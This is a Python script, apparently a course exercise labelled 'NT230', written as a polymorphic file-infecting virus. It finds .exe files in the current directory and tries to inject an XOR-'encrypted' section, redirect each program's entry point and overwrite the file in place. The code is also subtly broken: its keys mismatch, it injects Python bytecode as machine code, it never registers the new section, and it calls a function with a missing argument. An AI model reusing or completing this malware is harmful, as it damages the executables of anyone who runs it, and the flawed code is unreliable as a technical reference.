import pefile
import random
import string
import ctypes
import os

# Define the payload message
payload_message = "21522056_21522641_21521248"

# Define the pop-up message box function
def show_popup(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 1)

# Define the XOR encryption function
def xor_encrypt(data, key):
    encrypted_data = b''
    for char in data:
        encrypted_data += bytes([char ^ key])
    return encrypted_data

# Define the XOR decryption function
def xor_decrypt(encrypted_data, key):
    original_data = b''
    for char in encrypted_data:
        original_data += bytes([char ^ key])
    return original_data

# Define the polymorphic transformation function
def polymorphic_transformation(code, original_key):
    # Randomly swap instructions
    instructions = list(code)
    for _ in range(random.randint(5, 10)):
        pos1 = random.randint(0, len(instructions) - 2)
        pos2 = random.randint(0, len(instructions) - 2)
        instructions[pos1], instructions[pos2] = instructions[pos2], instructions[pos1]

    # Calculate the new key based on the transformed code
    new_key = sum(instructions) % 256

    # Return the transformed code and the new key
    return bytes(instructions), new_key if new_key != original_key else (original_key + 1) % 256

# Define the function to infect a PE file
def infect_pe_file(file_path, payload_message):
    try:
        pe = pefile.PE(file_path)  # Open the PE file

        # Get the original data of the PE file
        original_data = pe.get_memory_mapped_image()

        # Create the payload
        title = "Infection by NT230"
        message = payload_message.format(*['21522056', '21522641', '21521248'])
        payload_code = create_payload(title, message)

        # Encrypt the virus using XOR
        key = random.randint(0, 255)
        encrypted_virus = xor_encrypt(original_data, key)

        # Polymorphic transformation
        transformed_code, new_key = polymorphic_transformation(encrypted_virus, key)

        # Calculate the new key based on the transformed code
        new_key = sum(transformed_code) % 256

        # Decrypt the transformed virus
        decrypted_virus = xor_decrypt(transformed_code, new_key)

        # Create a new section for the virus
        new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)  # Create a new section
        new_section.Name = b".reloc"  # Set the section name to .reloc
        new_section.VirtualSize = len(decrypted_virus)  # Set the virtual size
        new_section.VirtualAddress = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize  # Set the virtual address
        new_section.SizeOfRawData = len(decrypted_virus)  # Set the size of raw data
        new_section.PointerToRawData = len(pe.__data__)  # Set the pointer to raw data
        new_section.Characteristics = 0x42000040  # Characteristics for .reloc section

        # Write the virus to the new section
        pe.set_bytes_at_offset(new_section.PointerToRawData, decrypted_virus)

        # Write the payload to the beginning of the new section
        pe.set_bytes_at_offset(new_section.PointerToRawData + len(decrypted_virus), payload_code)

        # Calculate the new entry point
        new_entry_point = new_section.VirtualAddress + len(decrypted_virus)

        # Write the new entry point to the PE file
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point

        # Save changes to the original PE file by overwriting it
        pe.write(file_path)

        # Close the PE file
        pe.close()

        # Display a message box only if the PE file was infected
        if pefile.PE(file_path).DIRECTORY_ENTRY_IMPORT:
            show_popup("Infection successful", "The file has been infected with the NT230 virus.")

    except Exception as e:
        print("Error:", e)

# Define the function to create the payload
def create_payload(title, message):
    def popup_payload():
        ctypes.windll.user32.MessageBoxW(0, message, title, 1)
    return popup_payload.__code__.co_code

# List to store the names of infected files
infected_files = []

# Infect all PE files in the current directory
current_dir = os.getcwd()
files_name = [f for f in os.listdir(current_dir) if (os.path.isfile(os.path.join(current_dir, f)) & f.endswith(".exe"))]  # Lấy tên các file exe trong thư mục hiện tại
for file in files_name:
    print(file)  # In tên các file exe
    for file in files_name:
        pe = pefile.PE(file)  # Mở từng file exe
        last_section = pe.sections[-1]  # Lấy phần cuối cùng
        last_section_name = last_section.Name.decode('UTF-8').rstrip('\x00')  # Lấy tên của phần cuối cùng
        pe.close()  # Đóng file exe
        if pe.FILE_HEADER.Machine == 0x8664 or last_section_name == ".test":  # Kiểm tra nếu là 64-bit hoặc đã được xử lý rồi
            continue
        else:
            infect_pe_file(file)  # Nếu không thì thêm mã độc vào file